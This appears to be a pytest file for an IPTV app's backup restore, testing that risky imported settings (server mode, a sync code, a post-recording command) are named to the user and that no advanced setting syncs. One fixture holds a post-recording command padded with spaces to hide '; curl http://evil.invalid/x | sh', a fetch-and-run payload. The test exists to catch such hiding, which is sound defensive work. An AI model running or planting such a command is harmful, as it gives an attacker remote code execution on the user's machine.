"""What a restore shows before anything is taken - and what never comes
with a sync at all.

A backup is a file: one made by somebody else can turn server mode on
(the channels served to the home network, its tuner without a token), join
this computer to a sync whose code its maker knows, or set the command that
runs after a recording. Each is named before the person chooses, and the
command is shown whole: cut at 90 characters, whatever came after them was
hidden. No Nerd setting - the command among them - ever syncs.
"""

from __future__ import annotations

import pytest

from dopeiptv.core import backup, sync
from dopeiptv.i18n import tr
from dopeiptv.ui.backup_dialogs import RestoreBackupDialog


@pytest.fixture
def qapp():
    from PyQt6.QtWidgets import QApplication
    return QApplication.instance() or QApplication([])


def _backup(**main):
    return backup.parse({backup.MAGIC: 1, "app_version": "1.6.8", "created": "",
                         "stores": {"main": {"theme": "nord", **main}}})


def test_server_mode_turned_on_by_a_backup_is_named():
    assert ("nerd_server", "") in backup.risky(_backup(nerd_server="true"))
    assert backup.risky(_backup(nerd_server="false")) == []
    lines = RestoreBackupDialog.risky_lines(backup.risky(_backup(nerd_server="true")), [])
    assert lines == [tr("nerd_card_server") + " · " + tr("nerd_server")]
    # With its channels for adults on, said beside it.
    b = _backup(nerd_server="true", nerd_server_adult="true")
    assert ("nerd_server", "nerd_server_adult") in backup.risky(b)
    lines = RestoreBackupDialog.risky_lines(backup.risky(b), [])
    assert lines == [tr("nerd_card_server") + " · " + tr("nerd_server") + " · " + tr("srv_adult")]
    # The switch for adults alone (server mode off) lets nobody in.
    assert backup.risky(_backup(nerd_server_adult="true")) == []


def test_a_sync_a_backup_joins_is_named_and_its_code_never_shown():
    code = "ABCD-EFGH-JKLM-NPQR-STUV-WXYZ-2345-6789-ABCD-EFGH-JKLM-NPQR-STUV"
    b = _backup(sync_code=code)
    assert (backup.SYNC_CODE, "") in backup.risky(b)
    assert backup.SYNC_CODE == sync.K_CODE
    lines = RestoreBackupDialog.risky_lines(backup.risky(b), [])
    assert lines == [tr("sync_title") + " · " + tr("sync_code")]
    assert "ABCD" not in "".join(lines)
    assert backup.risky(_backup(sync_code="  ")) == []


def test_the_command_after_a_recording_is_shown_whole():
    command = "/bin/sh -c 'echo recording done" + " " * 120 + "; curl http://evil.invalid/x | sh'"
    b = _backup(nerd_rec_post=command, nerd_mpv_options="--script=/tmp/" + "a" * 150 + "/x.lua")
    shown = dict(backup.risky(b))
    lines = RestoreBackupDialog.risky_lines(backup.risky(b), [])
    post = next(line for line in lines if tr("nerd_rec_post") in line)
    assert "curl http://evil.invalid/x | sh" in post and "…" not in post
    mpv = next(line for line in lines if tr("nerd_mpv_options") in line)
    assert mpv.endswith("/x.lua") and "…" not in mpv
    assert shown["nerd_rec_post"].endswith("| sh'")
    # Another setting's value is still cut: an address is told by its start.
    long_proxy = "http://proxy.invalid:8080/" + "p" * 200
    line = RestoreBackupDialog.risky_lines([("nerd_proxy", long_proxy)], [])[0]
    assert line.endswith("…") and len(line) < len(long_proxy)


def test_the_restore_window_holds_those_lines(qapp):
    b = _backup(nerd_server="true", sync_code="AAAA-BBBB", nerd_rec_post="notify-send {title}",
                playlists="[]")
    d = RestoreBackupDialog(None, b, backup.summary(b), 0, backup.risky(b))
    try:
        notes = d.shown_text()
        assert tr("restore_risky") in notes
        for part in (tr("nerd_server"), tr("sync_title"), "notify-send {title}"):
            assert part in notes
        assert "AAAA-BBBB" not in notes
    finally:
        d.deleteLater()


def test_no_nerd_setting_ever_syncs():
    """A command set on one computer never becomes one on another: no Nerd
    setting syncs, whichever of the lists it would be on."""
    for key in ("nerd_rec_post", "nerd_mpv_options", "nerd_mpv_config_dir", "nerd_server",
                "nerd_server_adult", "nerd_remote", "nerd_share", "nerd_mqtt_commands",
                "nerd_hooks_urls", "nerd_proxy", "nerd_enabled", "nerd_rec_template",
                "profiles/kid/nerd_rec_post", "recording_jobs", "recordings_dir", "sync_code"):
        assert not sync.syncable(key), key
    assert not any(k.startswith("nerd_") for k in sync.SETTINGS_ALLOW)
    assert not any(p.startswith("nerd") for p in sync.SETTINGS_ALLOW_PREFIX)
